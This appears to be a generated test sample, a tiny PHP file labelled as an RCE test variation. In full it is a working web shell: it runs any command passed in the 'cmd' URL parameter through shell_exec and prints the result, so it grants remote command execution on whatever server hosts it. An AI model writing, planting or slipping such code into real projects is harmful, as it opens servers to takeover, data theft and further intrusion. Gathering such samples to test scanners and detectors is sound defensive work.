<?php
// RCE test variation #663
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>